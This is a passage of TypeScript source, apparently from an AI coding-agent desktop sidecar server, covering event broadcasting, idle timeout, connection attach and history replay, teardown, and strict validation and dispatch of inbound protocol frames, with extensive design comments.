    this.onDeliveryStage = options.onDeliveryStage ?? null
    this.onFrameDropped = options.onFrameDropped ?? null
    this.onTurnLifecycle = options.onTurnLifecycle ?? null
    this.turnStallMs = options.turnStallMs ?? DEFAULT_TURN_STALL_MS

    // Subscribe once; broadcast every event to all connected clients as a raw
    // `event` frame. (P1-0 has one client, but the fan-out matches the WS
    // server's broadcast model.)
    this.unsubscribe = this.controller.subscribe(event => {
      // Before the broadcast: `broadcastEvent` returns early with no clients
      // attached, and a turn that hangs with the window closed is exactly the
      // case this needs to see.
      this.observeTurnEvent(event)
      this.broadcastEvent(event)
      this.observeGeneratedImageEvent(event)
      // HOST-REQUEST-PLANE §4 step 4a — the three events that can move presence,
      // and only those: turn boundaries and permission open/close. Deliberately
      // NOT every event: `message` fires many times a second during streaming
      // and cannot change either input, so recomputing on it would be pure cost.
      if (
        event.type === 'turn.status' ||
        event.type === 'permission.requested' ||
        event.type === 'permission.resolved'
      ) {
        this.publishActivity()
      }
      // NO per-turn context-breakdown refresh. The analysis is not cheap enough
      // to be automatic: `analyzeContextUsage` fans out to ~10
      // `countTokensWithFallback` calls (system prompt, tool schemas, each memory
      // file, each agent, skills, messages), each a real
      // `anthropic.beta.messages.countTokens`, and on failure a HAIKU SAMPLING
      // fallback (`src/services/tokenEstimation.ts:82-112,177`). Worse on a
      // `gpt-*` session: `getAnthropicClient` re-derives the provider from the
      // MODEL STRING, so count_tokens takes the Codex path, fails, and bills the
      // Anthropic fallback instead. Per turn, per session, that is a real cost for
      // a panel nobody may open. `/context` pays it only on explicit user demand.
      // The breakdown is recomputed only by the on-demand request verb; a
      // turn-boundary refresh belongs there, not here.
    })
    // The terminal REPL owns an equivalent between-turn drain. Desktop submits
    // straight to this sidecar, so this process owns the idle wake-up for its
    // single engine session. Never submit from this synchronous listener.
    this.unsubscribeTaskNotificationQueue = subscribeToCommandQueue(() => {
      // D1a — the queue is the source of truth for what is still waiting, so
      // every change to it republishes the staged list. Synchronous, unlike the
      // drain below: this is a read, not a turn.
      this.broadcastQueuedPrompts()
      this.scheduleBoundaryDrain()
    })
    // D1a — the engine's own consumption signal. `notifyCommandLifecycle(uuid,
    // 'started')` fires on the drain that actually takes a queued command into
    // the running turn (`src/query.ts:1839`), immediately before
    // `removeFromQueue`, which makes it the exact moment a staged message
    // becomes real. The sidecar's older comment claimed no such signal existed
    // without reaching into engine internals; it was already wrong when written.
    //
    // FRAGILE BY CONSTRUCTION: `setCommandLifecycleListener` holds ONE slot
    // (`src/utils/commandLifecycle.ts:8`), not a subscriber set, so a second
    // claimant in this process silently takes the signal away from whoever
    // claimed it first. Nothing else claims it here: the only other setter is
    // `src/cli/remoteIO.ts:159`, reached solely by constructing `RemoteIO`,
    // which only `src/cli/print.ts` does and no sidecar path imports. The
    // N-process model (one engine session per process) is what keeps this to one
    // SidecarServer per process; `close()` releases the slot.
    //
    // The engine HAS its own emitter for this and it is deliberately unused.
    // `QueryEngine` already yields a `type:'user'` SDK message for a consumed
    // `queued_command`, keyed on `source_uuid` (`src/QueryEngine.ts:1009-1031`),
    // and it is inert here only because nothing in the sidecar sets
    // `replayUserMessages` (default false, `src/QueryEngine.ts:258`). Turning it
    // on is not free: the same flag also builds `messagesToAck`
    // (`src/QueryEngine.ts:553`), which re-yields the turn's own initial user
    // messages as replays (`:866-883`). The sidecar already broadcasts that row
    // itself, so every ordinary turn would gain a duplicate user row in the raw
    // event stream and in the transcript built from it. Paying that on every
    // turn to avoid the slot below was the worse trade.
    //
    // The single-server-per-process invariant is load-bearing (a second
    // claimant leaves the first's staged messages with no path to the
    // transcript), so a takeover from a LIVE owner is logged loudly rather than
    // left to be inferred from messages that never appear.
    if (commandLifecycleOwner !== null && !commandLifecycleOwner.closed) {
      this.log(
        '[sidecar] command-lifecycle listener taken over by a second SidecarServer in this process; the previous session will not commit its staged messages',
      )
    }
    setCommandLifecycleListener((uuid, state) => {
      if (state !== 'started') return
      this.commitStagedPrompt(uuid)
    })
    commandLifecycleOwner = this

    // C3 (PERMISSION-BOUNDARY.md §4) — emit a fresh snapshot on EVERY live
    // context change. Store-subscription (not emit-after-boundary-writes) is
    // required: the context also mutates without boundary involvement (C1
    // updates applied by the engine's decision path, PermissionRequest hooks
    // applying rules mid-turn).
    if (this.permissions) {
      this.unsubscribePermissionContext =
        this.permissions.subscribeToolPermissionContext(context => {
          this.broadcastPermissionContext(context)
        })
    }
    if (this.goals) {
      this.unsubscribeGoalSnapshot = this.goals.subscribe(() => {
        this.broadcastThreadGoalSnapshot()
      })
    }
    if (this.memory) {
      this.unsubscribeMemorySnapshot = this.memory.subscribe(() => {
        this.broadcastMemorySnapshot()
      })
    }
    if (this.tasks) {
      this.unsubscribeTasksSnapshot = this.tasks.subscribe(() => {
        this.broadcastTasksSnapshot()
      })
    }
    if (this.agentMode) {
      this.unsubscribeAgentModeSnapshot = this.agentMode.subscribe(() => {
        void this.broadcastAgentModeSnapshot()
      })
    }
    // P4-32b — leases move on the SAME events that move the worker roster (a
    // spawn registers a lease, a finish releases one), so the lease seam rides
    // the same store subscription rather than polling the lease manager.
    if (this.leases) {
      this.unsubscribeLeaseSnapshot = this.leases.subscribe(() => {
        this.broadcastLeaseSnapshot()
      })
    }
    // A finished worker's roster row is removed by the engine EVICTING its task,
    // not by a display filter — and until this owner existed nothing came back at
    // the engine's `evictAfter` deadline in the desktop, so the row stayed above
    // the composer for the rest of the session (`panelTaskReaper.ts`).
    if (this.panelTaskReaper) {
      this.stopPanelTaskReaper = this.panelTaskReaper.start()
    }
    // P4-24c — re-broadcast the run-controls snapshot whenever the session's
    // model/effort/fast actually changes. The domain's subscribe is change-detected
    // (no per-token storm), so this fires on a `*.set` verb OR any engine path that
    // moves those fields — the faces reflect live with no respawn.
    if (this.runControls) {
      this.unsubscribeRunControlsSnapshot = this.runControls.subscribe(() => {
        this.broadcastRunControlsSnapshot()
      })
    }

    // CC-3: the server starts with zero connections. A sidecar that is spawned
    // but never attached (a dev-harness spawn, or a supervisor that dies before
    // connecting) must not linger forever — arm the idle timer now. A real
    // supervisor attach cancels it well within the (generous) TTL.
    this.armIdleTimer()
    this.scheduleBoundaryDrain()

    // Catalog owner (decision #4): the sidecar no longer enumerates or broadcasts
    // the sessions catalog. A single main-supervised worker owns it and delivers
    // it to the renderer as a `sessions-catalog` host event
    // (`docs/migration/decisions/CATALOG-OWNERSHIP.md`), so no attached sidecar
    // pays the per-session enumeration plateau (the RAM-3.1 win).
  }

  /* --------------------------------------------------------------------- *
   * CC-3 — idle self-exit timer (SESSION-LIFETIME §2 janitor; L2-additive).
   * --------------------------------------------------------------------- */

  /**
   * Arm the idle timer iff enabled AND currently idle. Fires `onIdle` after
   * `idleTtlMs` of continuous zero-connection time. Re-checks the connection
   * count at fire time (belt-and-suspenders against a race between a late
   * connect and the timer callback).
   */
  private armIdleTimer(): void {
    if (this.idleTtlMs <= 0 || !this.onIdle) return
    if (this.idleTimer) return // already counting down
    if (this.connections.size > 0) return // a live connection: never TTL
    this.idleTimer = setTimeout(() => {
      this.idleTimer = null
      if (this.connections.size === 0) {
        this.log(
          `[sidecar] idle for ${this.idleTtlMs}ms with no supervisor connection — self-exiting (CC-3)`,
        )
        this.onIdle?.()
      }
    }, this.idleTtlMs)
  }

  /** Cancel the idle timer (a connection is open, or the server is closing). */
  private clearIdleTimer(): void {
    if (this.idleTimer) {
      clearTimeout(this.idleTimer)
      this.idleTimer = null
    }
  }

  /** Register a new client connection (called by the transport on connect). */
  addConnection(socket: SidecarSocketLike): Connection {
    // A live connection means this sidecar is attached — never idle-exit while
    // one is open (CC-3).
    this.clearIdleTimer()
    const connection: Connection = {
      socket,
      decoder: new FrameDecoder(MAX_FRAME_BYTES),
      rateWindowStart: Date.now(),
      rateCount: 0,
      closed: false,
      deliveryConnectionEpoch: ++this.deliveryConnectionEpoch,
      loadEarlierAnchorUuid: null,
      loadEarlierReplayed: false,
      loadEarlierComplete: false,
    }
    this.connections.add(connection)
    // Keep the `app.ready` handshake at the IPC attachment boundary.
    const readyPayload = {
      type: 'app.ready' as const,
      protocolVersion: PROTOCOL_VERSION,
      inputEnabled: !this.activeTurn,
      activeTurn: this.activeTurn,
      abort: this.controller.getAbortState(),
      goalSnapshot: this.controller.getGoalSnapshot(),
      pendingPermissionRequests: this.controller.getPendingPermissionRequests(),
    }
    const preparedPayload = this.prepareOutboundPayload(readyPayload, 'ready', 'payload')
    if (preparedPayload) {
      this.send(connection, {
        kind: 'ready',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        engineSessionId: this.engineSessionId,
        ...(this.turnInterrupted ? { turnInterrupted: true } : {}),
        payload: preparedPayload,
      })
    }
    // C3 — snapshot on attach, immediately after `ready` (a separate app-owned
    // frame; the engine-owned AppReadyPayload is deliberately not widened).
    if (this.permissions) {
      this.sendPermissionContext(
        connection,
        this.permissions.getToolPermissionContext(),
      )
    }
    // P4-3 — the settings source/precedence snapshot, after C3 (read-only,
    // point-in-time on attach; source/editable/managed model only, no values).
    this.sendSettingsSnapshot(connection)
    // P4-7 — agent definition config snapshot, after settings and before replay.
    this.sendAgentConfigSnapshot(connection)
    // P4-10 — read-only goals + memory snapshots, before replay and with no new
    // inbound vocabulary or renderer-authored state.
    this.sendThreadGoalSnapshot(connection)
    this.sendMemorySnapshot(connection)
    // P4-9 — read-only background-task snapshot, alongside the other P4-10
    // snapshots and before replay; no new inbound vocabulary or renderer-
    // authored task state.
    this.sendTasksSnapshot(connection)
    // P4-8 — read-only orchestrator worker snapshot (persisted agent-mode state ∪
    // live local_agent workers), alongside the P4-9 tasks snapshot. Async + best-
    // effort (a non-agent-mode session degrades to an empty roster); fire-and-forget
    // since a read-only snapshot has no ordering dependency on history replay.
    void this.sendAgentModeSnapshot(connection)
    // P4-32b — read-only Codex lease snapshot (which account each agent in this
    // session's swarm is leasing), right after the worker roster it joins to.
    // Outbound only: there is no lease verb and no new inbound vocabulary.
    this.sendLeaseSnapshot(connection)
    // P4-24c — composer run-controls snapshot (current model/effort/fast + the real
    // selectable options + availability). Read-at-call + re-broadcast on change; no
    // renderer-authored state (the value/selection rides the app-owned write verbs).
    this.sendRunControlsSnapshot(connection)
    // P4-5 — redacted Codex account pool snapshot (the canonical domain read-seam),
    // after the other snapshots and before replay. Read-only + secretGuard-clean by
    // construction; re-broadcast after any pool-mutating account verb.
    this.sendAccountsSnapshot(connection)
    // Usage analytics is main-owned. Ordinary attachment must not multiply a
    // full transcript scan across every session process; explicit stats.query is
    // retained for the versioned protocol's supported request path.
    // The pool loads observation-only in the sidecar (no engine startup path
    // runs `initAccountPool`), so the first snapshot's usage hints are 0/null.
    // Fire the same read-only wham/usage GET the engine runs at startup, ONCE,
    // then re-broadcast the now-populated snapshot. Best-effort — a failure
    // (offline / stale tokens) leaves the initial snapshot untouched.
    this.refreshAccountsUsageOnce()
    // P4-14 — read-only workspace-trust + diagnostics snapshots, after the
    // other snapshots and before replay. Both spawn-time-frozen (no new
    // inbound vocabulary, no renderer-authored state).
    this.sendWorkspaceTrustSnapshot(connection)
    this.sendDiagnosticsSnapshot(connection)
    // P4-12 — read-only settings extensions (MCP/plugins/skills/hooks) config
    // snapshot, after the other snapshots and before replay. No inbound vocabulary.
    this.sendExtensionsSnapshot(connection)
    // P4-13 — RemoteSettings read-seam (bridge status + command-filter truth),
    // after accounts and before replay. Read-only; re-broadcast after a
    // mutating `remoteSettings.*` verb.
    this.sendRemoteSettingsSnapshot(connection)
    // Catalog owner (decision #4): the cross-workspace sessions catalog is no
    // longer sent on attach — a single main-supervised worker owns it and pushes
    // it to the renderer as a `sessions-catalog` host event.
    // The rich slash-command catalog (name + arg-hint + description), before
    // history + any live event so the composer picker renders prototype-parity
    // rows on a fresh session's very first keystroke. Single-socket ordering
    // guarantees the renderer projects it before the user could type `/`.
    this.sendSlashCatalogSnapshot(connection)
    // D1a — messages already waiting for a running response. A renderer that
    // reloaded mid-turn has to get these back or a message the user already sent
    // is invisible until the turn ends. Normally sent only when there is
    // something to report: an attaching reader's own list already starts empty,
    // and an empty frame on every handshake is noise (the
    // `slash-catalog.snapshot` precedent).
    //
    // The exception is the one case where an attaching reader's list does NOT
    // start empty: main keeps the last published list in a sticky replay slot, so
    // a reader that attaches after "published [A], connection dropped, A
    // delivered" is handed [A] out of the replay and would keep showing a message
    // as waiting that the turn has already taken. The change that emptied the list
    // could not be published (no connection was open, so `broadcastQueuedPrompts`
    // sent nothing and committed nothing), which is exactly why the last PUBLISHED
    // key is the condition here: non-empty means somebody may still be holding it,
    // so send the empty snapshot once and commit it.
    const stagedForAttach = this.queuedPromptItems()
    if (
      stagedForAttach.length > 0 ||
      this.lastQueuedPromptsKey !== EMPTY_QUEUED_PROMPTS_KEY
    ) {
      this.sendQueuedPrompts(connection, stagedForAttach)
      this.lastQueuedPromptsKey = JSON.stringify(stagedForAttach)
    }
    // HOST-REQUEST-PLANE §4 step 4a — presence, last in the attach burst and
    // before history replay.
    //
    // Its VALUE is derived at ready: `currentPresence()` reads the same two
    // sources the `app.ready` payload above was built from, and nothing between
    // here and there can start a turn or open a permission prompt, so a freshly
    // ready idle session reports `idle` at once and is never simply absent from
    // `peers.list`. It is sent UNCONDITIONALLY, unlike the conditional snapshots
    // above it, because "no presence" and "idle" are different answers and only
    // one of them is true.
    //
    // Last rather than first because C3 pins `permission.context` immediately
    // after `ready` and that adjacency is a renderer contract; presence is not,
    // and it is `sticky` in main's retention table for the same reason as the
    // snapshots it joins — nothing re-sends it on a renderer reload, so an
    // evicted one would blank the very window `peers.list` exists to answer for.
    const attachPresence = this.currentPresence()
    this.lastPublishedPresence = attachPresence
    this.sendActivity(connection, attachPresence)
    // F2 — restored-history replay, after ready + C3 and before any live event
    // (single-socket ordering guarantees the renderer sees history first).
    this.sendHistoryReplay(connection)
    return connection
  }

  /**
   * Send the read-only `slash-catalog.snapshot` (name + description + arg hint) to
   * one attaching connection. Display metadata only, secretGuard-clean by
   * construction; still goes through the normal outbound `send` path (secretGuard
   * + size cap). Skipped when the catalog is empty (probe / degraded load).
   */
  private sendSlashCatalogSnapshot(connection: Connection): void {
    if (this.slashCatalog.length === 0) return
    this.send(connection, {
      kind: 'slash-catalog.snapshot',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      commands: [...this.slashCatalog],
    })
  }

  /**
   * F2 (decisions/RESTORE-HISTORY.md) — replay the restored transcript to one
   * attaching connection as standard `event` frames with `replay: true`. The
   * NEWEST contiguous tail is kept under BOTH caps (frames + serialized bytes,
   * the same accounting main's replay buffer uses, so a renderer reload
   * preserves the same history — the ≤-buffer alignment is test-enforced). Any
   * omission emits the truncation-boundary error frame BEFORE the tail (the
   * main replay-buffer idiom): a capped replay is visibly lossy, never a
   * silent gap. Every frame goes through the normal outbound path —
   * prepareOutboundPayload (clone + JSON-safe) and send (secretGuard + size
   * cap) — the replay adds no security bypass.
   */
  private sendHistoryReplay(connection: Connection): void {
    if (this.history.length === 0 && !this.historySourceTruncated) return

    const retained: ServerFrame[] = []
    let retainedBytes = 0
    let oldestRetainedUuid: string | undefined
    let truncated = this.historySourceTruncated
    // Walk newest → oldest so the cap keeps the most recent history. Stop (not
    // skip) at the first frame that would overflow: a contiguous newest tail,
    // never a mid-history hole.
    for (let i = this.history.length - 1; i >= 0; i--) {
      const message = this.history[i]!
      const prepared = this.prepareOutboundPayload(
        createMessageEvent(message),
        'event',
        'history replay',
      )
      if (!prepared) {
        // Un-serializable restored message (should not happen for
        // JSONL-round-tripped content) — an omission, so the replay is lossy.
        truncated = true
        continue
      }
      const frame: ServerFrame = {
        kind: 'event',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        replay: true,
        event: prepared,
      }
      const frameBytes = Buffer.byteLength(JSON.stringify(frame), 'utf8')
      if (
        retained.length + 1 > MAX_HISTORY_REPLAY_FRAMES ||
        retainedBytes + frameBytes > MAX_HISTORY_REPLAY_BYTES
      ) {
        truncated = true
        break
      }
      retained.push(frame)
      retainedBytes += frameBytes
      // Walking newest -> oldest, so the LAST message accepted is the oldest one
      // put on THIS socket. That, not the loaded array, is where
      // `history.loadEarlier` has to reach back from: the caps may have dropped
      // an older prefix that was loaded but never sent, and that prefix is
      // exactly what the deeper read exists to recover.
      if (typeof message.uuid === 'string') {
        oldestRetainedUuid = message.uuid
      }
    }
    // Per connection, and reset on every attach: this reader has just been sent
    // the ORIGINAL tail, whatever an earlier reader already recovered past.
    connection.loadEarlierAnchorUuid = oldestRetainedUuid ?? null
    connection.loadEarlierReplayed = retained.length > 0
    connection.loadEarlierComplete = false
    retained.reverse()

    if (truncated) {
      this.log(
        `[sidecar] history replay truncated: retained ${retained.length}/${this.history.length} events (${retainedBytes} bytes)`,
      )
      this.sendError(
        connection,
        HISTORY_REPLAY_TRUNCATION_REQUEST_ID,
        'internal_error',
        `Only the ${retained.length} most recent messages are shown.`,
        false,
      )
    }
    for (const frame of retained) {
      this.send(connection, frame)
    }
  }

  removeConnection(connection: Connection): void {
    if (connection.closed) return
    connection.closed = true
    this.connections.delete(connection)
    // CC-3: the last supervisor connection just dropped (e.g. a host crash left
    // this sidecar orphaned). Start the idle countdown; a reconnect within the
    // TTL cancels it again.
    if (this.connections.size === 0) {
      this.armIdleTimer()
    }
  }

  /** Feed a raw socket chunk for a given connection. */
  handleData(connection: Connection, chunk: Buffer): void {
    // Bun may deliver data after an outbound write failure or during the
    // wrapper's deferred close. A removed socket is no longer an authenticated
    // transport endpoint, so it must be inert before framing or dispatch.
    if (connection.closed || !this.connections.has(connection)) return
    const results = connection.decoder.push(chunk)
    for (const result of results) {
      if (result.kind === 'error') {
        this.sendError(connection, undefined, 'bad_request', result.reason, false)
        // A framing error is unrecoverable; close the connection.
        connection.socket.end()
        this.removeConnection(connection)
        return
      }

      if (!this.checkRate(connection)) {
        this.rejectFrameWithSubmitAnswer(
          connection,
          result.payload,
          requestIdForRejectedFrame(result.payload),
          'bad_request',
          'rate limit exceeded',
          true,
        )
        continue
      }

      this.handleFrame(connection, result.payload)
    }
  }

  /** Tear down the controller + permission-context subscriptions. */
  close(): void {
    this.closed = true
    this.clearIdleTimer()
    this.clearTurnStallTimer()
    this.unsubscribe?.()
    this.unsubscribe = null
    this.unsubscribePermissionContext?.()
    this.unsubscribePermissionContext = null
    this.unsubscribeGoalSnapshot?.()
    this.unsubscribeGoalSnapshot = null
    this.unsubscribeMemorySnapshot?.()
    this.unsubscribeMemorySnapshot = null
    this.unsubscribeTasksSnapshot?.()
    this.unsubscribeTasksSnapshot = null
    this.unsubscribeAgentModeSnapshot?.()
    this.unsubscribeAgentModeSnapshot = null
    this.unsubscribeLeaseSnapshot?.()
    this.unsubscribeLeaseSnapshot = null
    this.unsubscribeRunControlsSnapshot?.()
    this.unsubscribeRunControlsSnapshot = null
    this.unsubscribeTaskNotificationQueue?.()
    this.unsubscribeTaskNotificationQueue = null
    // Release the single-slot lifecycle listener, but only if it is still OURS:
    // in a process that built a second server (the boundary tests do), clearing
    // unconditionally would take the signal away from the live one.
    if (commandLifecycleOwner === this) {
      setCommandLifecycleListener(null)
      commandLifecycleOwner = null
    }
    this.stagedPrompts.clear()
    this.recalledPrompts.clear()
    this.lateRecallDeliveries.clear()
    // Settle every in-flight host request rather than leaving its caller waiting
    // on a socket that is about to close, and clear the timers so a closed
    // server holds nothing (the boundary tests build several per process).
    for (const [requestId, pending] of this.pendingHostRequests) {
      clearTimeout(pending.timer)
      this.pendingHostRequests.delete(requestId)
      pending.settle({
        ok: false,
        error: { code: 'unavailable', message: 'the session is closing' },
      })
    }
    this.stopPanelTaskReaper?.()
    this.stopPanelTaskReaper = null
    for (const connection of this.connections) {
      connection.socket.end()
    }
    this.connections.clear()
  }

  /* --------------------------------------------------------------------- *
   * Inbound (client → engine): validate, then apply. Trust boundary here.
   * --------------------------------------------------------------------- */

  private handleFrame(connection: Connection, payload: unknown): void {
    // A renderer-minted request id is safe to echo back on a boundary refusal,
    // but only when it is already a bounded string. It never authorizes work;
    // it lets the renderer retire the pending click instead of leaving it stuck.
    const requestId = requestIdForRejectedFrame(payload)

    // Envelope check: protocol version + session addressing.
    if (
      typeof payload !== 'object' ||
      payload === null ||
      (payload as ClientFrame).protocolVersion !== PROTOCOL_VERSION
    ) {
      this.sendError(
        connection,
        requestId,
        'bad_request',
        'missing or wrong protocolVersion',
        false,
      )
      return
    }

    const frame = payload as Partial<ClientFrame>
    if (frame.sessionId !== this.sessionId) {
      // In P1-0 there is one sidecar per sessionId; a mismatched address is a
      // routing bug or a forged frame. Reject rather than act on it.
      this.sendError(
        connection,
        requestId,
        'bad_request',
        'sessionId does not address this sidecar',
        false,
      )
      return
    }

    // F10 — strict allowlist. The reused Zod objects STRIP unknown keys rather
    // than reject them, so a frame like `{type:"app.ping", nonce, runCommand}`
    // would silently pass. The contract (SECURITY-MINIMUM §2, ".strict()",
    // "everything else rejected and logged") requires rejection. Enforce it with
    // an explicit key allowlist before the schema parse.
    const strictError = checkStrictKeys(frame.message)
    if (strictError) {
      this.log(`[sidecar] rejected frame with unexpected keys: ${strictError}`)
      this.rejectFrameWithSubmitAnswer(
        connection,
        payload,
        requestId,
        'bad_request',
        strictError,
        false,
      )
      return
    }

    // C2 — `permission.setMode` is app-owned vocabulary validated by a
    // sidecar-LOCAL schema (PERMISSION-BOUNDARY.md §3). The engine's shared
    // `appClientMessageSchema` is deliberately NOT extended: the WS server
    // shares it and must not silently start accepting a frame it has no
    // handler for (Phase-3 F3 owns any consolidation).
    if (
      (frame.message as { type?: unknown } | null | undefined)?.type ===
      'permission.setMode'
    ) {
      this.handleSetMode(connection, frame.message)
      return
    }

    // IDLE-PARK (decisions/IDLE-PARK.md §2/§3) — host-initiated park is app-owned
    // vocabulary validated by a sidecar-LOCAL schema (like C2). The engine's
    // shared `appClientMessageSchema` is deliberately NOT extended. The gate +
    // latch live HERE because only the sidecar knows the true turn/permission/
    // task state at the instant of park (main's frame-derived view can be stale
    // by one in-flight submit). Originated ONLY by main's policy driver — no
    // preload channel forwards it — but validated at the trust boundary regardless.
    if (
      (frame.message as { type?: unknown } | null | undefined)?.type === 'app.park'
    ) {
      this.handlePark(connection, frame.message)
      return
    }

    // HOST-REQUEST-PLANE HR5 — the two MAIN-originated inbound kinds, app-owned
    // vocabulary validated by sidecar-LOCAL schemas exactly like C2 and the park
    // frame above. `host.result` settles one request this sidecar minted an id
    // for; `peer.deliver` is a message another session sent, routed by main.
    // Both are inbound at the trust boundary and are treated as such.
    if (
      (frame.message as { type?: unknown } | null | undefined)?.type === 'host.result'
    ) {
      this.handleHostResult(frame.message)
      return
    }
    if (
      (frame.message as { type?: unknown } | null | undefined)?.type === 'peer.deliver'
    ) {
      this.handlePeerDeliver(connection, frame.message)
      return
    }

    // C5 (P4-20, ASK-USER-QUESTION-ANSWER.md) — the AskUserQuestion answer is
    // app-owned vocabulary validated by a sidecar-LOCAL schema (like C2), then
    // resolved through the engine's OWN `respondToPermissionRequest` allow path.
    // The engine's shared `appClientMessageSchema` is deliberately NOT extended.
    if (
      (frame.message as { type?: unknown } | null | undefined)?.type ===
      'askUserQuestion.answer'
    ) {
      this.handleAskUserQuestionAnswer(connection, frame.message)
      return
    }

    // P4-5 — account lifecycle verbs are app-owned vocabulary (like C2), each
    // validated by a sidecar-LOCAL schema and dispatched to the engine's own
    // account machinery. The engine's shared schema is deliberately not extended.
    const messageType = (frame.message as { type?: unknown } | null | undefined)
      ?.type
    if (typeof messageType === 'string' && messageType === 'stats.query') {
      this.handleStatsQuery(connection, frame.message)
      return
    }

    if (messageType === 'account.profileDeleted') {
      this.handleAccountProfileDeleted(connection, frame.message)
      return
    }

    if (typeof messageType === 'string' && messageType.startsWith('account.')) {
      this.handleAccountVerb(connection, frame.message)
      return
    }

    // P4-13 — RemoteSettings verbs are app-owned vocabulary (like C2 and the
    // P4-5 account verbs), validated by a sidecar-LOCAL schema and dispatched
    // to the engine's own bridge/direct-connect primitives.
    if (
      typeof messageType === 'string' &&
      messageType.startsWith('remoteSettings.')
    ) {
      this.handleRemoteSettingsVerb(connection, frame.message)
      return
    }

    // P4-19 — the settings WRITE verb is app-owned vocabulary (like C2 and the
    // account/RemoteSettings verbs), validated by a sidecar-LOCAL schema + the
    // closed EDITABLE_SETTINGS allowlist and applied through the engine's
    // SettingsUpdater-under-lock form. NOT part of the engine's shared schema.
    if (typeof messageType === 'string' && messageType.startsWith('settings.')) {
      this.handleSettingsVerb(connection, frame.message)
      return
    }

    // P4-15 — the workspace-trust accept verb is app-owned vocabulary (like C2
    // and the account/RemoteSettings/settings verbs), validated by a sidecar-
    // LOCAL schema and dispatched to the engine's OWN trust persistence
    // (`saveCurrentProjectConfig`). NOT part of the engine's shared schema.
    if (typeof messageType === 'string' && messageType.startsWith('workspace.')) {
      this.handleWorkspaceTrustVerb(connection, frame.message)
      return
    }

    // P4-8b — the agent-mode set verb is app-owned vocabulary (like C2 and the
    // account/RemoteSettings/settings/workspace verbs), validated by a sidecar-
    // LOCAL schema and dispatched to the engine's OWN `matchSessionMode` (a live
    // env switch, no respawn). NOT part of the engine's shared schema.
    if (typeof messageType === 'string' && messageType.startsWith('agent-mode.')) {
      this.handleAgentModeSet(connection, frame.message)
      return
    }

    // P4-8b — task-control verbs are app-owned vocabulary, validated by a
    // sidecar-local schema and dispatched to the engine's own stop, dismiss, or
    // background machinery. They are not part of the shared engine schema.
    if (
      typeof messageType === 'string' &&
      (TASK_CONTROL_VERB_TYPES as readonly string[]).includes(messageType)
    ) {
      void this.handleTaskControlVerb(connection, frame.message)
      return
    }

    // P4-24c — the composer run-control set verbs (model.set / effort.set /
    // fast.set) are app-owned vocabulary (like C2 and the account/RemoteSettings/
    // settings/workspace/agent-mode verbs), validated by a sidecar-LOCAL schema and
    // dispatched to the engine's OWN per-session setters (a live change, no
    // respawn). NOT part of the engine's shared schema. Membership test (three
    // distinct prefixes) rather than a single startsWith.
    if (
      typeof messageType === 'string' &&
      (RUN_CONTROL_VERB_TYPES as readonly string[]).includes(messageType)
    ) {
      this.handleRunControlVerb(connection, frame.message)
      return
    }

    // Queue controls are app-owned vocabulary, validated by sidecar-local schemas
    // and served from the engine's own command queue. Force-send carries an
    // engine-minted queued-prompt id; recall carries no target.
    if (
      typeof messageType === 'string' &&
      (PROMPT_FORCE_VERB_TYPES as readonly string[]).includes(messageType)
    ) {
      this.handlePromptForce(connection, frame.message)
      return
    }

    if (
      typeof messageType === 'string' &&
      (PROMPT_RECALL_VERB_TYPES as readonly string[]).includes(messageType)
    ) {
      this.handlePromptRecall(connection, frame.message)
      return
    }

    // The context-breakdown request — app-owned vocabulary, validated by a
    // sidecar-LOCAL schema. It takes no renderer input, so acceptance decides
    // only WHETHER to spend the analysis, never what it computes over.
    if (
      typeof messageType === 'string' &&
      (CONTEXT_BREAKDOWN_VERB_TYPES as readonly string[]).includes(messageType)
    ) {
      this.handleContextBreakdownRequest(frame.message)
      return
    }

    // The load-earlier read verb (decisions/HISTORY-LOAD-EARLIER.md) is
    // app-owned vocabulary validated by a sidecar-LOCAL schema, like C2 and the
    // context-breakdown request. It carries NO renderer-authored state beyond a
    // correlation id, so acceptance decides only WHETHER to spend a deeper read
    // of THIS session's own transcript, never which file is read or how much of
    // it. The engine's shared `appClientMessageSchema` is deliberately NOT
    // extended.
    if (
      typeof messageType === 'string' &&
      (HISTORY_LOAD_EARLIER_VERB_TYPES as readonly string[]).includes(messageType)
    ) {
      void this.handleHistoryLoadEarlier(connection, frame.message)
      return
    }

    // P4-6b — the session-action WRITE verbs are app-owned vocabulary (like the
    // account/settings/workspace/
    // agent-mode/run-control verbs), validated by a sidecar-LOCAL schema and
    // dispatched to the engine's own domain operations. NOT part of the engine's
    // shared schema. Membership test rather than a broad `session.` prefix.
    if (
      typeof messageType === 'string' &&
      (SESSION_ACTION_VERB_TYPES as readonly string[]).includes(messageType)
    ) {
      this.handleSessionActionVerb(connection, frame.message)
      return
    }

    // The message payload MUST pass the existing allowlist schema. Anything
    // else is dropped at the boundary (SECURITY-MINIMUM §2, R2 — validate at
    // the trust boundary, never trust the preload).
    const parsed = appClientMessageSchema.safeParse(frame.message)
    if (!parsed.success) {
      this.rejectFrameWithSubmitAnswer(
        connection,
        payload,
        undefined,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid message',
        false,
      )
      return
    }

    this.dispatch(connection, parsed.data, frame.message)
  }

  private dispatch(
    connection: Connection,
    message: AppClientMessage,
    rawMessage: unknown,
  ): void {
    switch (message.type) {
      case 'app.ping':
        if (message.nonce.length > MAX_TEXT_FIELD_CHARS) {
          this.sendError(connection, undefined, 'bad_request', 'nonce too long', false)
          return
        }
        this.send(connection, {
          kind: 'pong',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          nonce: message.nonce,
        })
        return

      case 'app.abort':
        if ((message.reason?.length ?? 0) > MAX_TEXT_FIELD_CHARS) {
          this.sendError(
            connection,
            message.requestId,
            'bad_request',
            'abort reason too long',
            false,
          )
          return
        }
        this.controller.abort(message.reason)
        return

      case 'permission.response':
        this.handlePermissionResponse(connection, message, rawMessage)
        return

      case 'app.submit': {
        // The correlation id is read from the RAW message: the engine's shared
        // schema strips it (see `submitCorrelationSchema`). Fail closed on a
        // malformed one rather than run the turn with no way to answer it.
        const correlation = submitCorrelationSchema.safeParse(rawMessage)
        if (!correlation.success) {
          this.sendError(
            connection,
            message.requestId,
            'bad_request',
            correlation.error.issues[0]?.message ?? 'invalid submitId',
            false,
          )
          return
        }
        this.handleSubmit(connection, message, correlation.data.options?.submitId)
        return
      }
    }
  }

  /** True when the main parent queue has a desktop-deliverable worker result. */
  private hasQueuedParentTaskNotification(): boolean {
